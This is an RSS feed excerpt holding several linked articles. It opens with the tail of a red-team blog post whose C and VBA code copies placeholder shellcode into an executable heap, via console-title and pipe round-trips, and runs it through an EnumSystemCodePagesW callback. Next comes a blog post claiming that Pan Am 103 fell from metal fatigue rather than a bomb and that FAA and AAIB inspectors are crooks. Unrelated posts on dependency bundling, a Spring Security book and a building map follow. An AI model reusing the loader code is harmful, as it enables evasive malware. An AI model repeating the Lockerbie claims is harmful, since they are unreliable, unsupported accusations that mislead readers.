</code></pre></div></div> <p>Aaand fire in the hole!</p> <figure> <img src="https://adepts.of0x.cc/alternatives-copy-shellcode/canon.png" alt="Shellcode copied to RWX buffer using PathCanonicalizeA"> <figcaption> Shellcode copied to RWX buffer using PathCanonicalizeA. </figcaption> </figure>  <p>With this label we are referring to functions that first need to save the shellcode in a intermediate place, like an environment variable/window title/etc, and then retrieve it from that place. The easiest to spot are the <strong>Set</strong>/<strong>Get</strong> twins.</p> <p>A simple example that comes to our mind is saving the shellcode as a Console Tittle with <code>SetConsoleTitleA</code> and then calling <code>GetConsoleTitleA</code> to save it in our RWX region:</p> <div><div><pre><code><span>#include &lt;Windows.h&gt;
</span>
<span>int</span> <span>main</span><span>(</span><span>int</span> <span>argc</span><span>,</span> <span>char</span><span>**</span> <span>argv</span><span>)</span> <span>{</span>
	<span>LPCSTR</span> <span>orig_shellcode</span> <span>=</span> <span>"</span><span>\xcc\xcc\xcc\xcc</span><span>"</span><span>;</span>
	<span>LPSTR</span> <span>copied_shellcode</span> <span>=</span> <span>NULL</span><span>;</span>
	<span>HANDLE</span> <span>heap</span> <span>=</span> <span>NULL</span><span>;</span>
	<span>BOOL</span> <span>ret</span> <span>=</span> <span>0</span><span>;</span>

	<span>heap</span> <span>=</span> <span>HeapCreate</span><span>(</span><span>HEAP_CREATE_ENABLE_EXECUTE</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>);</span>
	<span>copied_shellcode</span> <span>=</span> <span>HeapAlloc</span><span>(</span><span>heap</span><span>,</span> <span>0</span><span>,</span> <span>0x10</span><span>);</span>
	<span>SetConsoleTitleA</span><span>(</span><span>orig_shellcode</span><span>);</span>
	<span>GetConsoleTitleA</span><span>(</span><span>copied_shellcode</span><span>,</span> <span>MAX_PATH</span><span>);</span>
	<span>EnumSystemCodePagesW</span><span>(</span><span>copied_shellcode</span><span>,</span> <span>0</span><span>);</span>
	<span>return</span> <span>0</span><span>;</span>
<span>}</span>
</code></pre></div></div> <p>Test it:</p> <figure> <img src="https://adepts.of0x.cc/alternatives-copy-shellcode/two-shots.png" alt="Shellcode copied using a Set/Get pair"> <figcaption> Shellcode copied using a Set/Get pair. </figcaption> </figure> <p>Also IPC mechanisms can fall into our “two-shots” category. For example, we can create an anonymous pipe to use it as <em>no man’s place</em> and call <code>WriteFile</code>/<code>ReadFile</code> to copy the shellcode:</p> <div><div><pre><code><span>#include &lt;Windows.h&gt;
</span>
<span>int</span> <span>main</span><span>(</span><span>int</span> <span>argc</span><span>,</span> <span>char</span><span>**</span> <span>argv</span><span>)</span> <span>{</span>
	<span>LPCSTR</span> <span>orig_shellcode</span> <span>=</span> <span>"</span><span>\xcc\xcc\xcc\xcc</span><span>"</span><span>;</span>
	<span>LPSTR</span> <span>copied_shellcode</span> <span>=</span> <span>NULL</span><span>;</span>
	<span>HANDLE</span> <span>heap</span> <span>=</span> <span>NULL</span><span>;</span>
	<span>HANDLE</span> <span>source</span> <span>=</span> <span>NULL</span><span>;</span>
	<span>HANDLE</span> <span>sink</span> <span>=</span> <span>NULL</span><span>;</span>
	<span>SECURITY_ATTRIBUTES</span> <span>saAttr</span><span>;</span>
	<span>DWORD</span> <span>size</span> <span>=</span> <span>0</span><span>;</span>

	<span>heap</span> <span>=</span> <span>HeapCreate</span><span>(</span><span>HEAP_CREATE_ENABLE_EXECUTE</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>);</span>
	<span>copied_shellcode</span> <span>=</span> <span>HeapAlloc</span><span>(</span><span>heap</span><span>,</span> <span>0</span><span>,</span> <span>0x10</span><span>);</span>

	<span>saAttr</span><span>.</span><span>nLength</span> <span>=</span> <span>sizeof</span><span>(</span><span>SECURITY_ATTRIBUTES</span><span>);</span>
	<span>saAttr</span><span>.</span><span>bInheritHandle</span> <span>=</span> <span>TRUE</span><span>;</span>
	<span>saAttr</span><span>.</span><span>lpSecurityDescriptor</span> <span>=</span> <span>NULL</span><span>;</span>

	<span>CreatePipe</span><span>(</span><span>&amp;</span><span>sink</span><span>,</span> <span>&amp;</span><span>source</span><span>,</span> <span>&amp;</span><span>saAttr</span><span>,</span> <span>0</span><span>);</span>
	<span>WriteFile</span><span>(</span><span>source</span><span>,</span> <span>orig_shellcode</span><span>,</span> <span>4</span><span>,</span> <span>&amp;</span><span>size</span><span>,</span> <span>NULL</span><span>);</span>
	<span>ReadFile</span><span>(</span><span>sink</span><span>,</span> <span>copied_shellcode</span><span>,</span> <span>4</span><span>,</span> <span>&amp;</span><span>size</span><span>,</span> <span>NULL</span><span>);</span>

	<span>EnumSystemCodePagesW</span><span>(</span><span>copied_shellcode</span><span>,</span> <span>0</span><span>);</span>
	<span>return</span> <span>0</span><span>;</span>
<span>}</span>
</code></pre></div></div> <p>It can be translated to VBA as:</p> <div><div><pre><code><span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>HeapCreate</span> <span>Lib</span> <span>"kernel32"</span> <span>(</span><span>ByVal</span> <span>flOptions</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>dwInitialSize</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>dwMaximumSize</span> <span>As</span> <span>LongPtr</span><span>)</span> <span>As</span> <span>LongPtr</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>HeapAlloc</span> <span>Lib</span> <span>"kernel32"</span> <span>(</span><span>ByVal</span> <span>hHeap</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>dwFlags</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>dwBytes</span> <span>As</span> <span>LongPtr</span><span>)</span> <span>As</span> <span>LongPtr</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>EnumSystemCodePagesW</span> <span>Lib</span> <span>"kernel32"</span> <span>(</span><span>ByVal</span> <span>lpCodePageEnumProc</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>dwFlags</span> <span>As</span> <span>Long</span><span>)</span> <span>As</span> <span>Long</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>CreatePipe</span> <span>Lib</span> <span>"kernel32"</span> <span>(</span><span>phReadPipe</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>phWritePipe</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>lpPipeAttributes</span> <span>As</span> <span>SECURITY_ATTRIBUTES</span><span>,</span> <span>ByVal</span> <span>nSize</span> <span>As</span> <span>Long</span><span>)</span> <span>As</span> <span>Long</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>ReadFile</span> <span>Lib</span> <span>"kernel32"</span> <span>(</span><span>ByVal</span> <span>hFile</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>lpBuffer</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>nNumberOfBytesToRead</span> <span>As</span> <span>Long</span><span>,</span> <span>lpNumberOfBytesRead</span> <span>As</span> <span>Long</span><span>,</span> <span>lpOverlapped</span> <span>As</span> <span>Long</span><span>)</span> <span>As</span> <span>Long</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>WriteFile</span> <span>Lib</span> <span>"kernel32"</span> <span>(</span><span>ByVal</span> <span>hFile</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>lpBuffer</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>nNumberOfBytesToWrite</span> <span>As</span> <span>Long</span><span>,</span> <span>lpNumberOfBytesWritten</span> <span>As</span> <span>Long</span><span>,</span> <span>lpOverlapped</span> <span>As</span> <span>Long</span><span>)</span> <span>As</span> <span>Long</span>


<span>Private</span> <span>Type</span> <span>SECURITY_ATTRIBUTES</span>
        <span>nLength</span> <span>As</span> <span>Long</span>
        <span>lpSecurityDescriptor</span> <span>As</span> <span>LongPtr</span>
        <span>bInheritHandle</span> <span>As</span> <span>Long</span>
<span>End</span> <span>Type</span>

<span>Sub</span> <span>poc</span><span>()</span>
    <span>Dim</span> <span>orig_shellcode</span><span>(</span><span>0</span> <span>To</span> <span>3</span><span>)</span> <span>As</span> <span>Byte</span>
    <span>Dim</span> <span>copied_shellcode</span> <span>As</span> <span>LongPtr</span>
    <span>Dim</span> <span>heap</span> <span>As</span> <span>LongPtr</span>
    <span>Dim</span> <span>size</span> <span>As</span> <span>Long</span>
    <span>Dim</span> <span>ret</span> <span>As</span> <span>Long</span>
    <span>Dim</span> <span>source</span> <span>As</span> <span>LongPtr</span>
    <span>Dim</span> <span>sink</span> <span>As</span> <span>LongPtr</span>
    <span>Dim</span> <span>saAttr</span> <span>As</span> <span>SECURITY_ATTRIBUTES</span>
    <span>Dim</span> <span>HEAP_CR…</span></code></pre></div></div></div></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://adepts.of0x.cc/alternatives-copy-shellcode/">https://adepts.of0x.cc/alternatives-copy-shellcode/</a></em></p>]]>
            </description>
            <link>https://adepts.of0x.cc/alternatives-copy-shellcode/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26210956</guid>
            <pubDate>Sun, 21 Feb 2021 05:04:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[FAA investigating Boeing 787 mfg flaws. Boeing 747 loses several engine parts]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26210862">thread link</a>) | @morpheos137
<br/>
February 20, 2021 | https://inteltoday.org/2021/02/20/lockerbie-faa-investigating-boeing-787-manufacturing-flaws-coincidence-update-v-boeing-747-loses-several-engine-parts-over-maastricht-after-explosion-in-one-engine/ | <a href="https://web.archive.org/web/*/https://inteltoday.org/2021/02/20/lockerbie-faa-investigating-boeing-787-manufacturing-flaws-coincidence-update-v-boeing-747-loses-several-engine-parts-over-maastricht-after-explosion-in-one-engine/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
						
<figure><blockquote><p><em>“The plane maker has told U.S. aviation regulators that it produced certain parts at its South Carolina facilities that failed to meet its own design and manufacturing standards, according to an Aug. 31 internal Federal Aviation Administration memo reviewed by The Wall Street Journal.”</em></p><p><em>The Wall Street Journal — Monday September 7 2020</em></p></blockquote></figure>



<div><figure><a href="https://gosint.files.wordpress.com/2020/09/787-suppliers.jpg"><img loading="lazy" data-attachment-id="22856" data-permalink="https://inteltoday.org/2020/09/08/lockerbie-faa-investigating-boeing-787-manufacturing-flaws-coincidence/787-suppliers/" data-orig-file="https://gosint.files.wordpress.com/2020/09/787-suppliers.jpg" data-orig-size="800,1011" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="787 suppliers" data-image-description="" data-medium-file="https://gosint.files.wordpress.com/2020/09/787-suppliers.jpg?w=237" data-large-file="https://gosint.files.wordpress.com/2020/09/787-suppliers.jpg?w=640" src="https://gosint.files.wordpress.com/2020/09/787-suppliers.jpg?w=237" alt="" width="518" height="653" srcset="https://gosint.files.wordpress.com/2020/09/787-suppliers.jpg?w=237 237w, https://gosint.files.wordpress.com/2020/09/787-suppliers.jpg?w=518 518w, https://gosint.files.wordpress.com/2020/09/787-suppliers.jpg?w=119 119w" sizes="(max-width: 518px) 100vw, 518px"></a></figure></div>



<p><strong>September 8 2020</strong> — New Evidence and Logic have led me to rewrite 30 years of History. In my book [Lockerbie — Three Decades of Lies: J’Accuse…!] I conclude that Pan Am Flight 103 disintegrated in flight over Lockerbie (December 21 1988) because of a massive structural failure due to well-known issues of metal fatigue in section 41 and 42 of the Boeing 747 (Series 100 &amp; 200), not because of an explosive device. As a result of my research, I expected that the FAA would investigate similar Boeing manufacturing flaws as new generations of Boeing airliners may have inherited a mild form of that disease. It is happening. Coincidence? <strong>Follow us on Twitter: @INTEL_TODAY</strong><span id="more-22832"></span></p>



<blockquote><p><em>RELATED POST:&nbsp;<a href="https://gosint.wordpress.com/2020/07/27/lockerbie-three-decades-of-lies-jaccuse-chapter-xi-jaccuse/" rel="bookmark">Lockerbie – Three Decades of Lies: J’Accuse…! [Chapter XI :&nbsp;J’Accuse!]</a></em></p></blockquote>



<p><strong>Lockerbie — Three Decades of Lies: J’Accuse…!</strong></p>



<blockquote><p><em>QUICK NOTES — To make it easier for the readers to retrieve various chapters of this book, I have created a&nbsp;<a href="https://gosint.wordpress.com/lockerbie/">special page</a>&nbsp; “Lockerbie” where all the links to the chapters will be listed with a brief description. You can access that page directly as it appears at the far right of the top bar of this blog. </em><em>END of NOTES</em></p><p><em><strong>Lockerbie — Three Decades of Lies: J’Accuse…!</strong></em></p></blockquote>



<figure><blockquote><p><em>“We immediately contacted the airlines that operate the eight affected planes to notify them of the situation, and the airplanes have been temporarily removed from service until they can be repaired. The rest of the in-service fleet has been determined to meet limit load capability, and we are inspecting production airplanes to ensure any issues are addressed prior to delivery.”</em></p><p><em>Boeing — Monday September 7 2020</em></p></blockquote></figure>



<p><strong>UPDATE (February 20 2021)</strong> — After an explosion in one of the engines, a Boeing 747-412 of Longtail Aviation [Bermuda] has lost several engine parts over Maastricht, in The Netherlands.</p>



<p>A few cars were damaged. The aircraft [Flight number LGT5504] had departed from Maastricht Aachen Airport. The plane landed safely at Liège airport, Belgium.</p>



<p>I am quite sure that if this accident had occurred on one of the first Boeing 747, the plane would have broken apart around section 41/42. Just like Pan Am 103, TWA 800 or Air India 182…</p>



<p><strong>UPDATE (January 28 2021)</strong> – The 737 MAX has already been cleared to resume flights in North America and Brazil, and is expected to gain approval in Europe this week.</p>



<p>Ed Pierson — a former senior manager at Boeing’s 737 plant in Seattle — claims that further investigation of electrical issues and production quality problems at the 737 factory is badly needed.</p>



<p>In his new report, Mr Pierson claims that regulators and investigators have largely ignored factors, which he believes, may have played a direct role in the accidents.</p>



<p>Mr. Pierson believes that both of the crashed aircraft suffered from production defects, almost from the moment they entered service.</p>



<blockquote><p><em>“The possibility of production defects playing a role in the accidents has not been addressed by regulators. This could lead to further tragedies, involving the Max or even a previous version of the 737.”</em></p></blockquote>



<p>The FAA — of course — insists it only approved the return to service of the Max, following a “comprehensive and methodical safety review process”.</p>



<p>The BBC quickly found a former senior inspector with the UK’s Air Accident Investigations Branch (AAIB) willing to dismiss Mr Pierson’s allegations…</p>



<p>Perhaps the most interesting aspect of the BBC article is the author, Theo Leggett. </p>



<p>Previously Legget had suggested strongly that the crashes of the both 737 Max planes had been caused by incompetent pilots. </p>



<p>His only evidence for this was statements by a congressman who was paid by Boeing.</p>



<p>Let me repeat this once again. The FAA and AAIB inspectors are crooks. They could not care less about your safety. They work for Boeing.</p>



<p>On November 2 2016, the UK Government [Department for Business, Energy &amp; Industrial Strategy (BEIS)] decided to withhold all Lockerbie air accident investigation reports [dating from 1990 Jan 01 to 1992 Dec 31] until at least 2026, and possibly indefinitely.</p>



<p>Pan Am Flight 103 disintegrated in flight over Lockerbie on December 21 1988 — not December 22 — because of a massive structural failure due to well-known issues of metal fatigue in section 41 and 42 of the Boeing 747, not because of an explosive device.</p>



<p>Why do you think the Lockerbie AAIB reports are still classified more than three decades after the tragedy? </p>



<p>Why were those technical reports ever classified in the first place? </p>



<p><strong>END of UPDATE</strong></p>



<figure><blockquote><p><em>“Ed Pierson’s report is very disturbing, about manufacturing issues in the Boeing factories that go well beyond just the Max, and also affect… the previous version of the 737. Boeing and the Federal Aviation Administration (FAA) must finally become more transparent, and begin to provide information and data, so that independent experts can determine the worthiness of the work that’s been done.”</em></p><p><em>Captain Chesley “Sully” Sullenberger</em></p></blockquote></figure>



<p><strong>September 8 2020</strong> — The US aviation authority is investigating manufacturing flaws in the Boeing 787 after the company reported that certain plane parts did not conform to its production standards.</p>



<p>According to an internal Federal Aviation Administration (FAA) memo seen by the Wall Street Journal, the regulator could be looking at quality control errors that may have potentially lasted for 10 years.</p>



<p>Boeing identified two issues with the manufacture of the join in a portion of the fuselage in some 787s that, in combination, result in a condition that does not meet their own design standards.</p>



<p><strong>Two issues?</strong></p>



<p>Some airplanes have shims that are not the proper size, and some airplanes have areas that do not meet skin flatness specifications.</p>



<blockquote><p><em>“Individually these issues, while not up to specifications, still meet limit load conditions. </em></p><p><em>When combined in the same location however, they result in a condition that does not meet limit load requirements.” [Boeing]</em></p></blockquote>



<p><strong>Which portion of the fuselage?</strong></p>



<p>The problem could possibly occur either at the forward or the rear fuselage. [See picture]</p>



<p>However, since the problem results partly from shims produced by Boeing, the issue is more likely to affect the rear fuselage.</p>



<p><strong>Why now?</strong></p>



<p>Boeing identified the suspect shims — produced at the North Charleston facility — in August 2019.</p>



<p>Why was the FAA and the airlines only informed last month?</p>



<p>If the FAA launches a full airworthiness directive it could cover about 900 jets.</p>



<p>Such a directive would force airlines operating the B787 Dreamliner to ground the jet and install fixes on the planes. The cost would be enormous.</p>



<p><strong>UPDATE I (September 12 2020)</strong> — A few details regarding the FAA investigation are emerging and it does not look good…</p>



<p>First, as I suggested in my first post, the issues are indeed about he aft fuselage of the Boeing 787, and the assembly of the Section 47/48.</p>



<blockquote><p><em>“Boeing is confident the population is limited to the eight affected aircraft with the combination of both the shimming and skin surface smoothness problems in the jet’s aft fuselage, <a href="https://theaircurrent.com/scoops/boeing-pulls-eight-787s-from-service-over-structural-issue/">first reported by&nbsp;</a><a href="https://theaircurrent.com/scoops/boeing-pulls-eight-787s-from-service-over-structural-issue/">TAC</a>.</em></p><p><em>The two issues together undermine the structural integrity of the 787’s aft fuselage join, making it unable to withstand the limit load or maximum forces the airplane could experience in service, according to a Boeing engineering analysis.”</em></p></blockquote>



<p>Seattle radio station KOMO reported on Thursday (Sept 10) that a US FAA document flagged that shims – material used to close gaps that can occur during production – were discarded before final fasteners were installed on the section. That left improper gaps in the tail sections of potentially hundreds of airplanes.</p>



<p>On Tuesday (Sept. 8 2020), in a short statement, Boeing also acknowledged a third additional quality issue on the 787 related to the jet’s horizontal stabilizer.</p>



<blockquote><p><em>“Boeing is also studying whether almost 900 horizontal stabilisers made at its Utah fabrication plant have gaps that could cause premature ageing in the small wing in the Dreamliner’s tail. </em></p><p><em>Boeing identified that problem in February and notified the Federal Aviation Administration (FAA). Repairs typically take four to 10 days.”</em></p></blockquote>



<figure><p><span><iframe width="640" height="360" src="https://www.youtube.com/embed/DpT8RT4KvUc?version=3&amp;rel=1&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;fs=1&amp;hl=en&amp;autohide=2&amp;wmode=transparent" allowfullscreen="true" sandbox="allow-scripts allow-same-origin allow-popups allow-presentation"></iframe></span>
</p></figure>



<p>Then, on September 11 2020, <a href="https://www.straitstimes.com/world/united-states/boeing-us-aviation-regulator-grapple-with-a-fourth-dreamliner-production-flaw?utm_term=Autofeed&amp;utm_campaign=sttw&amp;utm_medium=Social&amp;utm_source=Twitter#Echobox=1599793254">BLOOMBERG revealed</a> that Boeing was working with United States regulators to address yet another — FOURTH — production flaw in the same section.</p>



<p>This latest fault, involving a slight depression near where the plane’s vertical fin joins its fuselage, came to light in late 2019, the Chicago-based manufacturer said in an e-mailed statement.</p>



<p>Meanwhile….</p>



<p>Headline Publishing Group will publish a memoir by Cliff Todd, the former head of the Forensics Explosive Laboratory.</p>



<blockquote><p><em>“Non-fiction publisher Iain MacGregor acquired UK and Commonwealth rights (excluding Canada) from Mark Lucas at the Soho Agency.</em></p><p><em>Explosive: Catching the Bombers will examine the cases Todd dealt with throughout his career, including the device concealed in a radio cassette player that brought down Pan Am Flight 103 over Lockerbie (…)</em></p><p><em>Todd will walk readers through the investigations step by step, explaining the science, the forensic work and the emotional toll on him and his family life.”</em></p></blockquote>



<p>Obviously, my research has rattled some nerves… I can tell you that it will be fun to expose the frauds of that book.</p>



<p>In fact, I believe that it will achieve just the opposite the author intends to achieve.</p>



<p>I predict no one, but complete idiots, will still believe the story of the “Lockerbie bomb” after reading this idiotic fiction. Stay tuned!</p>



<p>PS — Would you like to buy your own 747? At more than $400m a piece, a nearly new Boeing 747 is out of reach for most and owning one is something the majority could only dream of.</p>


</div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://inteltoday.org/2021/02/20/lockerbie-faa-investigating-boeing-787-manufacturing-flaws-coincidence-update-v-boeing-747-loses-several-engine-parts-over-maastricht-after-explosion-in-one-engine/">https://inteltoday.org/2021/02/20/lockerbie-faa-investigating-boeing-787-manufacturing-flaws-coincidence-update-v-boeing-747-loses-several-engine-parts-over-maastricht-after-explosion-in-one-engine/</a></em></p>]]>
            </description>
            <link>https://inteltoday.org/2021/02/20/lockerbie-faa-investigating-boeing-787-manufacturing-flaws-coincidence-update-v-boeing-747-loses-several-engine-parts-over-maastricht-after-explosion-in-one-engine/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26210862</guid>
            <pubDate>Sun, 21 Feb 2021 04:43:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Modern software controls dependencies because it helps software authors]]>
            </title>
            <description>
<![CDATA[
Score 111 | Comments 107 (<a href="https://news.ycombinator.com/item?id=26210576">thread link</a>) | @todsacerdoti
<br/>
February 20, 2021 | https://utcc.utoronto.ca/~cks/space/blog/tech/BundlingHelpsSoftwareAuthors | <a href="https://web.archive.org/web/*/https://utcc.utoronto.ca/~cks/space/blog/tech/BundlingHelpsSoftwareAuthors">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>Modern software controls dependencies because it helps software authors</h2>

	<p><small>February 20, 2021</small></p>
</div><div><p>Over on Twitter <a href="https://twitter.com/thatcks/status/1363196953065099265">I had a hot take</a>:</p>

<blockquote><p>Hot take: Every distribution packager who's saying "you shouldn't
bundle dependencies" is implicitly telling software authors "you
should do more work for us and limit the features (and reliability) of
your software".</p>
</blockquote>

<p>(This was sparked by reading <a href="https://blogs.gentoo.org/mgorny/2021/02/19/the-modern-packagers-security-nightmare/">The modern packagerâ€™s security
nightmare</a>,
<a href="https://lobste.rs/s/zb1c4k/modern_packager_s_security_nightmare">via</a>.
I'm not exactly on one side or the other, but <a href="https://twitter.com/thatcks/status/1363263921960980485">I do think distributions
should be honest about what they're asking for</a> and I
don't think they're going to get it.)</p>

<p>This hot take is a bit too narrow. What really matters is software
authors and modern software systems restricting the versions of
dependencies (for both maximum and minimum versions). Explicit or
implicit bundling on top of that just makes the problem slightly worse
for distributions.</p>

<p>For software authors, restricting the versions of dependencies that
they work with reduces the amount of work that they have to do,
both to test against a range of versions and to either forever chase
after whatever changes those dependencies like to make or to forever
limit what features of dependencies they use to ones available in
old versions (and sometimes both at once). In theory, both testing
and chasing after changes would be dealt with by <a href="http://semver.org/">Semantic Versioning</a> (if everyone followed it), at least for a
single program. In practice, not only are people fallible but also
<a href="https://utcc.utoronto.ca/~cks/space/blog/tech/SemverHasLimits">people have a different understanding of what semantic versioning
means</a> because semantic versioning is ultimately
a social thing, not a technical one. Our field's history has shown
(sometimes vividly) that if software authors allow versions of
dependencies to move on them, soon or later things break and the
software author has to fix it.</p>

<p>(There's also the practical issue that not all dependencies even
claim or agree to follow semantic versioning in the first place.)</p>

<p>For distributors, once software authors start restricting versions
the distributor has both an upgrade problem and a distribution
problem. On the upgrade side, dealing with an issue in a program may now
require persuading it to accept a new version of a dependency. On the
distribution side, it's now likely that you'll have multiple programs
that have different version requirements for the same dependency. At the
very least this multiplies the packages involved.</p>

<p>(Many distributions also have package system design problems that
restricts the range of versions of things that they can have installed
at the same time. Even under <a href="http://semver.org/">Semantic Versioning</a>, this is a
problem for the distribution the moment that you have two programs
with conflicting version requirements that can't both be packaged and
installed at the same time.)</p>

<p>However, there's no free lunch here. What distributors want when
they ask for unbundled dependencies without version restrictions is
for software authors to do the work to accept any version of their
dependencies, or at least any version that falls within <a href="http://semver.org/">Semantic
Versioning</a>, and for dependencies to faithfully follow semver and
also make it possible to package and install different major versions
(at least) at the same time. <strong>Accepting a broad version range of your
dependencies is actual work</strong>, even apart from the limitations it may
impose on what your code and your software can do. Software authors and
the creators of software package ecosystems (like Go and Rust) are not
refusing to do this because they don't like distributions; they are
refusing to do this because they have found, over and over again, that
this doesn't really work and does cause problems for software authors
(and often users of programs) in the long run.</p>

<p>(The software community that's gone through this experience the
most visibly is Go, which started out with intrinsically unversioned
dependencies that were used universally across all your programs
by default and wound up switching to strongly versioned dependencies
after many people had many problems with that initial state. Go
experienced so many problems that <a href="https://utcc.utoronto.ca/~cks/space/blog/programming/FallibleSemverAndMVS">they adopted an unusually strict
and software author friendly versioning scheme</a>.)</p>

<p>It's popular for people to argue that software authors should be doing
this work anyway even if the distributions weren't asking for it,
so them actually doing it is no big deal. This is quite convenient
for the people making the argument, but it doesn't make the argument
valid. Software authors don't owe anyone any work what so ever; they
do whatever work serves their needs and is interesting to them. With
limited time and interest, it's both rational and proper for software
authors to optimize for their own development.</p>

<p>PS: Generally distributions also want some combination of all software
to update to the latest version of their dependencies and for
dependencies to explicitly support older versions. This is also extra
work for software authors, especially when the distribution also wants
it to happen for older versions of programs.</p>
</div></div>]]>
            </description>
            <link>https://utcc.utoronto.ca/~cks/space/blog/tech/BundlingHelpsSoftwareAuthors</link>
            <guid isPermaLink="false">hacker-news-small-sites-26210576</guid>
            <pubDate>Sun, 21 Feb 2021 03:36:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Curious what's in the Clubhouse app?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26210569">thread link</a>) | @jshchnz
<br/>
February 20, 2021 | https://www.emergetools.com/apps/clubhouse | <a href="https://web.archive.org/web/*/https://www.emergetools.com/apps/clubhouse">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.emergetools.com/apps/clubhouse</link>
            <guid isPermaLink="false">hacker-news-small-sites-26210569</guid>
            <pubDate>Sun, 21 Feb 2021 03:31:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Simplifying Spring Security]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26210394">thread link</a>) | @yogeshmali82
<br/>
February 20, 2021 | https://betterjavacode.com/programming/simplifying-spring-security | <a href="https://web.archive.org/web/*/https://betterjavacode.com/programming/simplifying-spring-security">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Finally, the book is here. <a href="https://gum.co/VgSdH" target="_blank" rel="noopener">Simplifying Spring Security</a>.</p><h2>Why I wrote this book?</h2><p>As part of writing this blog, I also follow few communities on Facebook. Most of these communities are related to Spring Framework and Spring Boot. The number of users asks questions related to Spring Security. Hence, I wondered why not write a book about it.</p><p>Also as a developer, when I’m writing a Spring Boot application, I often use Spring Security. Accordingly, I always felt like I was using this mysterious library that solves my authentication problems.&nbsp; I wanted to understand the fundamentals and how Spring Security dealt with authentication and authorization.</p><h2>What do I cover?</h2><p>In the book, I cover from fundamentals of authentication, authorization, and how to use Spring Security for different authentication flows. Also, I show these flows with examples. As part of the book, you will also get access to a source code repository that you can play with.</p><p>In short, I cover the following topics in the book:</p><ul><li>Introduction<ul><li>What is Spring Security?</li><li>How Spring Security fits in with Spring Boot Application?</li><li>Why you need Spring Security?</li></ul></li><li>Authentication<ul><li>What is authentication?</li><li>Authentication Architecture</li><li>Types of Authentication</li><li>Implementation of Different Flows</li></ul></li><li>Authorization<ul><li>What is authorization?</li><li>How does Spring Security handle authorization?</li><li>What are GrantedAuthorities?</li><li>Implementation of Authorization in an application</li></ul></li><li>Protection against common exploits<ul><li>Introduction</li><li>Transport Layer Security</li><li>Security HTTP Response Headers</li><li>Clickjacking Attack</li><li>Cross-site Request Forgery Attack (CSRF)</li></ul></li><li>Miscellaneous</li></ul><h2>Why should you buy this book?</h2><p>First, it is a technical book and if you are a developer, it will easily help you improve your career. You’ll learn a lot about authentication and can solve some crucial security problems that many applications face.</p><p>Most importantly, you can also build your own application and use any of these authentication mechanisms for the application.</p><p>Subsequently, if you are getting started for a job in Spring Boot or Spring Framework, the book will also help you in preparing for <a href="https://betterjavacode.com/programming/how-to-use-spring-boot-security-in-web-application-part-viii" target="_blank" rel="noopener">Spring Security</a> interviews.</p><p>Finally, the book is currently in Pre-Launch, it will be available on 7th February 2021. Why don’t you take advantage of Pre-launch?</p></div></div>]]>
            </description>
            <link>https://betterjavacode.com/programming/simplifying-spring-security</link>
            <guid isPermaLink="false">hacker-news-small-sites-26210394</guid>
            <pubDate>Sun, 21 Feb 2021 02:52:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[3D Map of All 10M Buildings in the Netherlands – Colored by Age]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26209951">thread link</a>) | @elsewhen
<br/>
February 20, 2021 | https://parallel.co.uk/netherlands/#13.8/52.365/4.9/0/40 | <a href="https://web.archive.org/web/*/https://parallel.co.uk/netherlands/#13.8/52.365/4.9/0/40">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="info">
		<p><strong>Building ages in the Netherlands</strong></p>
		<p>All 10 million or so buildings in the Netherlands. Building heights and date of construction from 3D BAG (Basisregistratie Adressen en Gebouwen) data.</p>
		<p>2020</p>
